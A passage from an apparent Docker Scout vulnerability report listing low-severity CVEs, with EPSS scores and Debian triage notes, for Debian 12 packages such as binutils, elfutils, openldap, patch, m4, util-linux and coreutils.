<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.119%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The demangle_template function in cplus-dem.c in GNU libiberty, as distributed in GNU Binutils 2.31.1, contains an integer overflow vulnerability (for "Create an array for saving the template argument values") that can trigger a heap-based buffer overflow, as demonstrated by nm.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=24039
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-13716?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.40-2"><img alt="low : CVE--2017--13716" src="https://img.shields.io/badge/CVE--2017--13716-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.40-2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.237%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>47th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The C++ symbol demangler routine in cplus-dem.c in libiberty, as distributed in GNU Binutils 2.29, allows remote attackers to cause a denial of service (excessive memory allocation and application crash) via a crafted file, as demonstrated by a call from the Binary File Descriptor (BFD) library (aka libbfd).

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=22009
Underlying bug is though in the C++ demangler part of libiberty, but MITRE
has assigned it specifically to the issue as raised within binutils.
binutils not covered by security support

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 7" src="https://img.shields.io/badge/L-7-fce1a9"/> <!-- unspecified: 0 --><strong>elfutils</strong> <code>0.188-2.1</code> (deb)</summary>

<small><code>pkg:deb/debian/elfutils@0.188-2.1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-1377?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1377" src="https://img.shields.io/badge/CVE--2025--1377-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.068%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in GNU elfutils 0.192. This issue affects the function gelf_getsymshndx of the file strip.c of the component eu-strip. The manipulation leads to denial of service. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used. The identifier of the patch is fbf1df9ca286de3323ae541973b08449f8d03aba. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32673
https://sourceware.org/git/?p=elfutils.git;a=fbf1df9ca286de3323ae541973b08449f8d03aba
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1376?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1376" src="https://img.shields.io/badge/CVE--2025--1376-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.068%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in GNU elfutils 0.192. This vulnerability affects the function elf_strptr in the library /libelf/elf_strptr.c of the component eu-strip. The manipulation leads to denial of service. It is possible to launch the attack on the local host. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The name of the patch is b16f441cca0a4841050e3215a9f120a6d8aea918. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32672
https://sourceware.org/git/?p=elfutils.git;a=commit;h=b16f441cca0a4841050e3215a9f120a6d8aea918
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1372?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1372" src="https://img.shields.io/badge/CVE--2025--1372-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.104%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU elfutils 0.192. It has been declared as critical. Affected by this vulnerability is the function dump_data_section/print_string_section of the file readelf.c of the component eu-readelf. The manipulation of the argument z/x leads to buffer overflow. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The identifier of the patch is 73db9d2021cab9e23fd734b0a76a612d52a6f1db. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32656
https://sourceware.org/bugzilla/show_bug.cgi?id=32657
https://sourceware.org/git/?p=elfutils.git;a=commit;h=73db9d2021cab9e23fd734b0a76a612d52a6f1db
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1371?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1371" src="https://img.shields.io/badge/CVE--2025--1371-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU elfutils 0.192 and classified as problematic. This vulnerability affects the function handle_dynamic_symtab of the file readelf.c of the component eu-read. The manipulation leads to null pointer dereference. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used. The patch is identified as b38e562a4c907e08171c76b8b2def8464d5a104a. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32655
https://sourceware.org/git/?p=elfutils.git;a=commit;h=b38e562a4c907e08171c76b8b2def8464d5a104a
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1365?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1365" src="https://img.shields.io/badge/CVE--2025--1365-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in GNU elfutils 0.192. This affects the function process_symtab of the file readelf.c of the component eu-readelf. The manipulation of the argument D/a leads to buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. The identifier of the patch is 5e5c0394d82c53e97750fe7b18023e6f84157b81. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32654
https://sourceware.org/git/?p=elfutils.git;a=commit;h=5e5c0394d82c53e97750fe7b18023e6f84157b81
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1352?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2025--1352" src="https://img.shields.io/badge/CVE--2025--1352-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.398%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU elfutils 0.192 and classified as critical. This vulnerability affects the function __libdw_thread_tail in the library libdw_alloc.c of the component eu-readelf. The manipulation of the argument w leads to memory corruption. The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The name of the patch is 2636426a091bd6c6f7f02e49ab20d4cdc6bfc753. It is recommended to apply a patch to fix this issue.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32650
Fixed by: https://sourceware.org/git/?p=elfutils.git;a=2636426a091bd6c6f7f02e49ab20d4cdc6bfc753
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-25260?s=debian&n=elfutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D0.188-2.1"><img alt="low : CVE--2024--25260" src="https://img.shields.io/badge/CVE--2024--25260-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=0.188-2.1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.014%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

elfutils v0.189 was discovered to contain a NULL pointer dereference via the handle_verdef() function at readelf.c.

---
- elfutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=31058
https://sourceware.org/git/?p=elfutils.git;a=commit;h=373f5212677235fc3ca6068b887111554790f944
Crash in CLI tool, considered only to be a normal bug by upstream

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 5" src="https://img.shields.io/badge/L-5-fce1a9"/> <!-- unspecified: 0 --><strong>openldap</strong> <code>2.5.13+dfsg-5</code> (deb)</summary>

<small><code>pkg:deb/debian/openldap@2.5.13%2Bdfsg-5?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-22185?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.13%2Bdfsg-5"><img alt="low : CVE--2026--22185" src="https://img.shields.io/badge/CVE--2026--22185-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.13+dfsg-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenLDAP Lightning Memory-Mapped Database (LMDB) versions up to and including 0.9.14, prior to commit 8e1fda8, contain a heap buffer underflow in the readline() function of mdb_load. When processing malformed input containing an embedded NUL byte, an unsigned offset calculation can underflow and cause an out-of-bounds read of one byte before the allocated heap buffer. This can cause mdb_load to crash, leading to a limited denial-of-service condition.

---
- openldap <unfixed> (unimportant)
- lmdb <unfixed>
[trixie] - lmdb <no-dsa> (Minor issue)
[bookworm] - lmdb <no-dsa> (Minor issue)
[bullseye] - lmdb <postponed> (Minor issue; can be fixed in next update)
https://seclists.org/fulldisclosure/2026/Jan/5
https://bugs.openldap.org/show_bug.cgi?id=10421
Fixed by: https://git.openldap.org/openldap/openldap/-/commit/8e1fda85532a3c74276df38a42d234dcdfa1e40d
OpenLDAP bundles lmdb but does not build mdb_load.c

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-15719?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.13%2Bdfsg-5"><img alt="low : CVE--2020--15719" src="https://img.shields.io/badge/CVE--2020--15719-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.13+dfsg-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.216%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libldap in certain third-party OpenLDAP packages has a certificate-validation flaw when the third-party package is asserting RFC6125 support. It considers CN even when there is a non-matching subjectAltName (SAN). This is fixed in, for example, openldap-2.4.46-10.el8 in Red Hat Enterprise Linux.

---
- openldap <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=965184)
https://bugs.openldap.org/show_bug.cgi?id=9266
https://bugzilla.redhat.com/show_bug.cgi?id=1740070
RedHat/CentOS applied patch: https://git.centos.org/rpms/openldap/raw/67459960064be9d226d57c5f82aaba0929876813/f/SOURCES/openldap-tlso-dont-check-cn-when-bad-san.patch
OpenLDAP upstream did dispute the issue as beeing valid, as the current libldap
behaviour does conform with RFC4513. RFC6125 does not superseed the rules for
verifying service identity provided in specifications for existing application
protocols published prior to RFC6125, like RFC4513 for LDAP.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-17740?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.13%2Bdfsg-5"><img alt="low : CVE--2017--17740" src="https://img.shields.io/badge/CVE--2017--17740-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.13+dfsg-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.643%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

contrib/slapd-modules/nops/nops.c in OpenLDAP through 2.4.45, when both the nops module and the memberof overlay are enabled, attempts to free a buffer that was allocated on the stack, which allows remote attackers to cause a denial of service (slapd crash) via a member MODDN operation.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi/Incoming?id=8759
nops slapd-module not built

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-14159?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.13%2Bdfsg-5"><img alt="low : CVE--2017--14159" src="https://img.shields.io/badge/CVE--2017--14159-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.13+dfsg-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.123%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

slapd in OpenLDAP 2.4.45 and earlier creates a PID file after dropping privileges to a non-root account, which might allow local users to kill arbitrary processes by leveraging access to this non-root account for PID file modification before a root script executes a "kill `cat /pathname`" command, as demonstrated by openldap-initscript.

---
- openldap <unfixed> (unimportant)
http://www.openldap.org/its/index.cgi?findid=8703
Negligible security impact, but filed #877512

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2015-3276?s=debian&n=openldap&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.13%2Bdfsg-5"><img alt="low : CVE--2015--3276" src="https://img.shields.io/badge/CVE--2015--3276-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.13+dfsg-5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.938%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The nss_parse_ciphers function in libraries/libldap/tls_m.c in OpenLDAP does not properly parse OpenSSL-style multi-keyword mode cipher strings, which might cause a weaker than intended cipher to be used and allow remote attackers to have unspecified impact via unknown vectors.

---
- openldap <unfixed> (unimportant)
Debian builds with GNUTLS, not NSS

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>patch</strong> <code>2.7.6-7</code> (deb)</summary>

<small><code>pkg:deb/debian/patch@2.7.6-7?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-45261?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.7.6-7"><img alt="low : CVE--2021--45261" src="https://img.shields.io/badge/CVE--2021--45261-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.7.6-7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.265%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An Invalid Pointer vulnerability exists in GNU patch 2.7 via the another_hunk function, which causes a Denial of Service.

---
- patch <unfixed> (unimportant)
https://savannah.gnu.org/bugs/?61685
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6952?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.7.6-7"><img alt="low : CVE--2018--6952" src="https://img.shields.io/badge/CVE--2018--6952-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.7.6-7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>11.805%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A double free exists in the another_hunk function in pch.c in GNU patch through 2.7.6.

---
- patch <unfixed> (unimportant)
https://savannah.gnu.org/bugs/index.php?53133
https://git.savannah.gnu.org/cgit/patch.git/commit/?id=9c986353e420ead6e706262bf204d6e03322c300
When fixing this issue make sure to not apply only the incomplete fix,
and opening CVE-2019-20633, cf. https://savannah.gnu.org/bugs/index.php?56683
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6951?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.7.6-7"><img alt="low : CVE--2018--6951" src="https://img.shields.io/badge/CVE--2018--6951-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.7.6-7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>13.556%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in GNU patch through 2.7.6. There is a segmentation fault, associated with a NULL pointer dereference, leading to a denial of service in the intuit_diff_type function in pch.c, aka a "mangled rename" issue.

---
- patch <unfixed> (unimportant)
https://git.savannah.gnu.org/cgit/patch.git/commit/?id=f290f48a621867084884bfff87f8093c15195e6a
https://savannah.gnu.org/bugs/index.php?53132
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4651?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.7.6-7"><img alt="low : CVE--2010--4651" src="https://img.shields.io/badge/CVE--2010--4651-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.7.6-7</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.830%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>82nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Directory traversal vulnerability in util.c in GNU patch 2.6.1 and earlier allows user-assisted remote attackers to create or overwrite arbitrary files via a filename that is specified with a .. (dot dot) or full pathname, a related issue to CVE-2010-1679.

---
- patch <unfixed> (unimportant)
Applying a patch blindly opens more severe security issues than only directory traversal...
openwall ships a fix
See https://bugzilla.redhat.com/show_bug.cgi?id=667529 for details

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>m4</strong> <code>1.4.19-3</code> (deb)</summary>

<small><code>pkg:deb/debian/m4@1.4.19-3?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2008-1688?s=debian&n=m4&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.4.19-3"><img alt="low : CVE--2008--1688" src="https://img.shields.io/badge/CVE--2008--1688-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.4.19-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.196%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>84th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Unspecified vulnerability in GNU m4 before 1.4.11 might allow context-dependent attackers to execute arbitrary code, related to improper handling of filenames specified with the -F option.  NOTE: it is not clear when this issue crosses privilege boundaries.

---
- m4 <unfixed> (unimportant)
The file name is passed through a cmdline argument and m4 doesn't run with
elevated privileges.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2008-1687?s=debian&n=m4&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.4.19-3"><img alt="low : CVE--2008--1687" src="https://img.shields.io/badge/CVE--2008--1687-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.4.19-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>2.727%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>86th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The (1) maketemp and (2) mkstemp builtin functions in GNU m4 before 1.4.11 do not quote their output when a file is created, which might allow context-dependent attackers to trigger a macro expansion, leading to unspecified use of an incorrect filename.

---
- m4 <unfixed> (unimportant)
This is more a generic bug and not a security issue: the random output would
need to match the name of an existing macro

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.38.1-5+b1</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.38.1-5%2Bb1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-28085?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.38.1-5%2Bdeb12u1"><img alt="low : CVE--2024--28085" src="https://img.shields.io/badge/CVE--2024--28085-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.38.1-5+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.38.1-5+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>11.917%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

wall in util-linux through 2.40, often installed with setgid tty permissions, allows escape sequences to be sent to other users' terminals through argv. (Specifically, escape sequences received from stdin are blocked, but escape sequences received from argv are not blocked.) There may be plausible scenarios where this leads to account takeover.

---
- util-linux 2.39.3-11 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067849)
https://www.openwall.com/lists/oss-security/2024/03/27/5
https://github.com/util-linux/util-linux/commit/404b0781f52f7c045ca811b2dceec526408ac253 (v2.40)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.38.1-5%2Bdeb12u3"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.38.1-5+deb12u3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.020%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/coreutils@9.1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5278?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D9.1-1"><img alt="low : CVE--2025--5278" src="https://img.shields.io/badge/CVE--2025--5278-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=9.1-1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>4th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.

---
- coreutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106733; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2368764
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00036.html
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00040.html
https://cgit.git.savannah.gnu.org/cgit/coreutils.git/commit/?id=8c9602e3a145e9596dc1a63c6ed67865814b6633
https://www.openwall.com/lists/oss-security/2025/05/27/2
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=78507
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-18018?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D9.1-1"><img alt="low : CVE--2017--18018" src="https://img.shields.io/badge/CVE--2017--18018-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=9.1-1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

